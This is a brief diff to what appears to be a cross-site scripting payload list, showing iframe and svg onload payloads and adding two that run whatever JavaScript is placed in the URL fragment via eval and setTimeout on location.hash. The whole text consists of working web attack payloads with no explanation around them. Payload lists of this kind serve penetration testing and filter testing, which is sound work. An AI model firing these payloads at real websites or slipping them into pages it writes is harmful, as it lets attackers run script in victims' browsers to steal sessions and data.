@@ -11,4 +11,9 @@
 <iframe><p title="</iframe><svg/onload=alert(1)>">
 <iframe style="visibility:hidden"><p title="</iframe><svg/onload=alert(1)>">
 <svg onload=alert(document.domain)>
+
+location:
+<body/onload=eval(location.hash.slice(1))>#alert(1)
+<body/onload=setTimeout(location.hash.substr(1))>#alert(1)
+
 ```
